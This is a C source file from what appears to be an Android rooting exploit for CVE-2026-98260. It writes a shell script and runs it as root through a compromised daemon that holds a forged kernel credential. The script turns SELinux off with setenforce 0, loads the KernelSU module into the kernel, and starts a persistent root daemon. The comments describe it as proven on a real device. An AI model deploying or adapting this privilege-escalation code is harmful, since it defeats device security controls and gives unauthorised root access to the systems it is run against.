/*
 * ksu.c - KernelSU takeover
 *
 * Corresponds to the PC reference reference: tools/ksu_activate.sh (pushed in run.py as
 * REMOTE_KSU_TAKEOVER and executed) and scripts/ksu_takeover.sh.
 *
 * Two on-device measured conclusions (from the reference impl comments):
 *   1) late-load must run as uid=0; when run as shell (uid 2000) rc=0
 *      but the module does not enter the kernel.
 *   2) after a successful load the kernel forces SELinux back to Enforcing, and rootd's unlabeled socket
 *      drops the link, so the script does no final verification; the criterion is moved to the parent, which uses
 *      'whether kernelsu appears in /proc/modules'.
 *
 * Therefore this module does not run ksud directly (this process is shell uid 2000); instead it
 * generates a takeover script and runs it via rootd's unix socket as uid=0 -- equivalent to run.py's
 *   printf 'KSU_EXPECT_SHA256=... sh /data/local/tmp/ksu_takeover.sh\n' | pc98260_su
 */

#define _GNU_SOURCE
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <time.h>
#include <unistd.h>

#include "ksu.h"

int pc98260_su_main(int argc, char **argv);

#define ROOT_SOCK_DEFAULT "/data/local/tmp/pc98260-root.sock"

static const char *ksu_home(void)
{
	const char *h = getenv("CVE98260_HOME");
	if (h && *h)
		return h;
	return "/data/local/tmp/cve98260-app";
}

/* bionic's strcasestr is not exported in all NDK versions; implement locally for stability */
static int strcasestr_local(const char *hay, const char *needle)
{
	size_t i, n = strlen(needle);
	if (!n)
		return 1;
	for (i = 0; hay[i]; i++) {
		size_t j;
		for (j = 0; j < n && hay[i + j]; j++) {
			if ((hay[i + j] | 32) != (needle[j] | 32))
				break;
		}
		if (j == n)
			return 1;
	}
	return 0;
}

static int uname_rel(char *out, size_t size)
{
	struct utsname u;
	if (uname(&u))
		return -1;
	snprintf(out, size, "%s", u.release);
	return 0;
}

static void sleep_ms(int ms)
{
	struct timespec ts;
	ts.tv_sec = ms / 1000;
	ts.tv_nsec = (long)(ms % 1000) * 1000000L;
	nanosleep(&ts, NULL);
}

/* derive KMI from uname -r: 6.6.118-android15-8-... -> android15-6.6
 *(equivalent to the sed expression in ksu_activate.sh) */
static void derive_kmi(char *out, size_t out_size)
{
	char rel[256] = { 0 };
	const char *android = NULL;
	char major[32] = { 0 };
	char minor[32] = { 0 };
	size_t i;

	if (uname_rel(rel, sizeof(rel)) != 0)
		rel[0] = 0;
	for (i = 0; rel[i]; i++) {
		if (!strncmp(rel + i, "android", 7)) {
			android = rel + i;
			break;
		}
	}
	if (rel[0]) {
		int part = 0;
		size_t start = 0;
		for (i = 0; rel[i]; i++) {
			if (rel[i] == '.') {
				if (part == 0) {
					size_t n = i - start;
					if (n >= sizeof(major))
						n = sizeof(major) - 1;
					memcpy(major, rel + start, n);
					major[n] = 0;
					start = i + 1;
					part = 1;
				} else if (part == 1) {
					size_t n = i - start;
					if (n >= sizeof(minor))
						n = sizeof(minor) - 1;
					memcpy(minor, rel + start, n);
					minor[n] = 0;
					break;
				}
			}
		}
	}
	if (android && major[0] && minor[0]) {
		char android_short[32] = { 0 };
		size_t k = 0;
		while (android[k] && android[k] != '-' && k + 1 < sizeof(android_short))
			k++;
		memcpy(android_short, android, k);
		android_short[k] = 0;
		snprintf(out, out_size, "%s-%s.%s", android_short, major, minor);
		return;
	}
	snprintf(out, out_size, "android15-6.6");
}

static int find_ksud(char *out, size_t out_size)
{
	const char *env = getenv("CVE98260_KSUD");
	const char *candidates[4];
	char built[512];
	size_t i;

	snprintf(built, sizeof(built), "%s/ksud", ksu_home());
	candidates[0] = env;
	candidates[1] = built;
	candidates[2] = "/data/local/tmp/ksud";
	candidates[3] = "/data/adb/ksud";
	for (i = 0; i < 4; i++) {
		struct stat st;
		if (!candidates[i] || !*candidates[i])
			continue;
		if (stat(candidates[i], &st))
			continue;
		if (!S_ISREG(st.st_mode))
			continue;
		snprintf(out, out_size, "%s", candidates[i]);
		return 0;
	}
	return -1;
}

/* Size of a file, or -1 when it cannot be stat'ed. Used to tell the bundled
 * ksud (6402736 B) apart from the device build under /data/adb/ksud. */
static long long file_size(const char *path)
{
	struct stat st;
	if (stat(path, &st))
		return -1;
	if (!S_ISREG(st.st_mode))
		return -1;
	return (long long)st.st_size;
}

static int modules_have_kernelsu(void)
{
	char line[512];
	FILE *f = fopen("/proc/modules", "r");
	if (!f)
		return 0;
	while (fgets(line, sizeof(line), f)) {
		if (strcasestr_local(line, "kernelsu")) {
			fclose(f);
			return 1;
		}
	}
	fclose(f);
	return 0;
}

/*
 * Flush the stage log to the block device.
 *
 * A kernel panic does not flush page cache, so on 23:06 the run died inside
 * this step and every diagnostic after the last checkpoint was lost as NUL
 * bytes - leaving no way to tell which attempt killed the kernel. Called only
 * at stage boundaries, never in a timing-sensitive window.
 */
static void ksu_sync(void)
{
	(void)fdatasync(STDOUT_FILENO);
}

static int write_takeover_script(const char *path, const char *ksud,
				 const char *kmi, const char *log)
{
	FILE *f = fopen(path, "w");
	if (!f)
		return -1;
	fprintf(f, "#!/system/bin/sh\n");
	fprintf(f, "# CVE-2026-98260 KSU takeover: this script is executed only by rootd (uid=0)\n");
	fprintf(f, "# Shape copied from the device-proven PC flow\n");
	fprintf(f, "# (CVE-2026-98260-NEW/tools/ksu_activate.sh:126-142):\n");
	fprintf(f, "#   one late-load --kmi attempt, then (only if not live) one plain\n");
	fprintf(f, "#   late-load. No --allow-shell, no wider ladder: the ladder was the\n");
	fprintf(f, "#   only substantial deviation from the verified combination.\n");
	fprintf(f, "KSUD='%s'\n", ksud);
	fprintf(f, "KMI='%s'\n", kmi);
	fprintf(f, "LOG='%s'\n", log);
	/* sync after every marker: a panic mid-attempt must not cost us the
	 * evidence of which attempt was running. */
	fprintf(f, "echo \"[ksu] begin uid=$(id -u) enf=$(getenforce)\" > \"$LOG\"\n");
	/* Identity check: the device carries a second, different ksud build under
	 * /data/adb/ksud (4990848 B) while the bundled one is 6402736 B. Print the
	 * size of whatever ksud actually gets used (find_ksud() has /data/adb/ksud
	 * in its fallback chain) so a wrong build is visible in the log. */
	fprintf(f, "SZ=$(stat -c %%s \"$KSUD\" 2>/dev/null)\n");
	fprintf(f, "[ -z \"$SZ\" ] && SZ=$(ls -l \"$KSUD\" 2>/dev/null | awk '{print $5}')\n");
	fprintf(f, "echo \"[ksu] ksud=$KSUD size=${SZ:-unknown}\" >> \"$LOG\"\n");
	/* Note: 6402736 is the bundled build (sha256 049491e2b4cc0a6c...). */
	fprintf(f, "echo \"[ksu] ksud_expected_size=6402736\" >> \"$LOG\"\n");
	fprintf(f, "sync\n");
	fprintf(f, "chmod 755 \"$KSUD\" 2>/dev/null\n");
	fprintf(f, "setenforce 0 2>/dev/null\n");
	fprintf(f, "echo \"[ksu] setenforce_rc=$? enf=$(getenforce 2>/dev/null)\" >> \"$LOG\"\n");
	fprintf(f, "sync\n");
	fprintf(f, "\n");
	/*
	 * live(): identical semantics to the PC script (ksu_activate.sh:54-56).
	 * late-load registers the module asynchronously; probing /proc/modules
	 * immediately after ksud returns gives a false negative ("rc=0 but
	 * live=no"), so every probe sleeps 1s first. Case-insensitive like the
	 * reference's `grep -qi`.
	 */
	fprintf(f, "live() { sleep 1; grep -qi kernelsu /proc/modules 2>/dev/null && echo yes || echo no; }\n");
	fprintf(f, "\n");
	fprintf(f, "LIVE=$(live)\n");
	fprintf(f, "echo \"[ksu] live_initial=$LIVE\" >> \"$LOG\"\n");
	fprintf(f, "if [ \"$LIVE\" = yes ]; then\n");
	fprintf(f, "  echo '[ksu] already_live' >> \"$LOG\"\n");
	fprintf(f, "  echo '[ksu] note: rc is not a criterion -- ksud returns 0 even on silent failure' >> \"$LOG\"\n");
	fprintf(f, "  exit 0\n");
	fprintf(f, "fi\n");
	fprintf(f, "\n");
	/* Attempt 1: the GUI-preferred single-parameter form (PC: ksu_activate.sh:132). */
	fprintf(f, "echo \"[ksu] try: late-load --kmi $KMI\" >> \"$LOG\"\n");
	fprintf(f, "\"$KSUD\" late-load --kmi \"$KMI\" >> \"$LOG\" 2>&1\n");
	fprintf(f, "echo \"[ksu] rc=$?\" >> \"$LOG\"\n");
	fprintf(f, "sync\n");
	fprintf(f, "LIVE=$(live)\n");
	fprintf(f, "echo \"[ksu] live=$LIVE\" >> \"$LOG\"\n");
	fprintf(f, "\n");
	/* Attempt 2 only when attempt 1 did not register the module (PC:136-140). */
	fprintf(f, "if [ \"$LIVE\" != yes ]; then\n");
	fprintf(f, "  echo '[ksu] try: late-load (no args, ksud picks the embedded KMI)' >> \"$LOG\"\n");
	fprintf(f, "  \"$KSUD\" late-load >> \"$LOG\" 2>&1\n");
	fprintf(f, "  echo \"[ksu] rc=$?\" >> \"$LOG\"\n");
	fprintf(f, "  sync\n");
	fprintf(f, "  LIVE=$(live)\n");
	fprintf(f, "  echo \"[ksu] live=$LIVE\" >> \"$LOG\"\n");
	fprintf(f, "fi\n");
	fprintf(f, "\n");
	/*
	 * Do NOT start the ksud daemon from here.
	 *
	 * This script runs through rootd, i.e. as uid 0 with the *injected forged*
	 * cred (SELinux: u:object_r:unlabeled:s0). Anything started from here
	 * inherits that cred, and the cred lives in a page the kernel no longer owns
	 * -- so the daemon could never be killed without risking a panic, and every
	 * later attempt to reclaim those pages becomes a minefield.
	 *
	 * The PC reference starts it from a plain adb shell instead (run.py:572
	 * `nohup /data/local/tmp/ksud &`), which gives the daemon a normal cred.
	 * The host does the same after this step returns, so all we do here is report
	 * the module state.
	 */
	/*
	 * Start the ksud daemon -- restored on purpose.
	 *
	 * The baseline APK that is proven to root this device (GhostKey111.apk)
	 * does exactly this, after the last late-load attempt and not inside the
	 * attempt loop; without it no su channel exists afterwards and the run
	 * reports "not rooted" even when the module did load. Real-device evidence
	 * outweighs the earlier reasoning that skipping it avoids handing the
	 * daemon a borrowed cred: the daemon is started here as uid 0, and any
	 * concern about its cred belongs to the host-side startKsudDaemon() path,
	 * not to dropping the step entirely.
	 *
	 * Guard with pidof so a daemon started by an earlier attempt is not
	 * duplicated.
	 */
	fprintf(f, "if ! pidof ksud >/dev/null 2>&1; then\n");
	fprintf(f, "  nohup \"$KSUD\" >/dev/null 2>&1 &\n");
	fprintf(f, "  sleep 2\n");
	fprintf(f, "fi\n");
	fprintf(f, "echo \"[ksu] daemon pid=$(pidof ksud 2>/dev/null)\" >> \"$LOG\"\n");
	fprintf(f, "\n");
	fprintf(f, "echo '[ksu] note: rc is not a criterion -- ksud returns 0 even on silent failure' >> \"$LOG\"\n");
	fprintf(f, "echo \"[ksu] end live=$LIVE\" >> \"$LOG\"\n");
	fprintf(f, "exit 0\n");
	fclose(f);
	chmod(path, 0755);
	return 0;
}

int ksu_takeover_main(int argc, char **argv)
{
	char ksud[512], kmi[64], script[512], log[512], cmd[1024];
	char *su_argv[4];
	int i, rc = 1;
	int already = 0;

	(void)argc;
	(void)argv;

	if (find_ksud(ksud, sizeof(ksud))) {
		fprintf(stderr, "[ksu] error: ksud not found (assets/ksu/ksud not bundled?)\n");
		return 1;
	}
	derive_kmi(kmi, sizeof(kmi));
	snprintf(script, sizeof(script), "%s/ksu_takeover.sh", ksu_home());
	snprintf(log, sizeof(log), "%s/ksu_takeover.log", ksu_home());

	fprintf(stdout, "[ksu] ksud=%s kmi=%s uid=%u\n", ksud, kmi,
		(unsigned)getuid());
	/*
	 * Diagnostic: two different ksud builds live on the device -- the bundled
	 * one is 6402736 B (sha256 049491e2b4cc0a6c...) while /data/adb/ksud is a
	 * 4990848 B device build, and find_ksud() has the latter in its fallback
	 * chain. Printing the size of whatever was actually picked tells us on the
	 * next run whether a wrong build was used.
	 */
	fprintf(stdout, "[ksu] ksud_size=%lld expected=6402736\n", file_size(ksud));
	ksu_sync();

	if (modules_have_kernelsu()) {
		fprintf(stdout, "[ksu] kernelsu already in /proc/modules, skip KSU\n");
		ksu_sync();
		already = 1;
		goto done;
	}

	if (write_takeover_script(script, ksud, kmi, log)) {
		fprintf(stderr, "[ksu] error: cannot write %s\n", script);
		ksu_sync();
		return 1;
	}
	/* The script itself is on disk before anything risky runs; make sure the
	 * fact that we got this far is durable too. */
	ksu_sync();

	snprintf(cmd, sizeof(cmd), "sh %s", script);
	fprintf(stdout, "[ksu] executing via rootd as uid=0: %s\n", cmd);
	ksu_sync();

	su_argv[0] = (char *)"su";
	su_argv[1] = (char *)"-c";
	su_argv[2] = cmd;
	su_argv[3] = NULL;
	rc = pc98260_su_main(3, su_argv);
	if (rc != 0)
		fprintf(stdout, "[ksu] warn: rootd channel exit code %d (possible connection failure)\n", rc);
	/* Last durable checkpoint before the poll: if the log stops here, the
	 * late-load itself (init_module) took the kernel down. */
	ksu_sync();

	/* late-load is asynchronous; poll for module registration */
	for (i = 0; i < 15; i++) {
		if (modules_have_kernelsu()) {
			already = 1;
			break;
		}
		sleep_ms(1000);
	}

done:
	if (already) {
		fprintf(stdout, "[ksu] success: kernelsu is in /proc/modules\n");
		fprintf(stdout, "C98260_KSU=loaded\n");
		return 0;
	}
	fprintf(stderr, "[ksu] error: /proc/modules has no kernelsu (see %s)\n", log);
	fprintf(stdout, "C98260_KSU=missing\n");
	return 1;
}
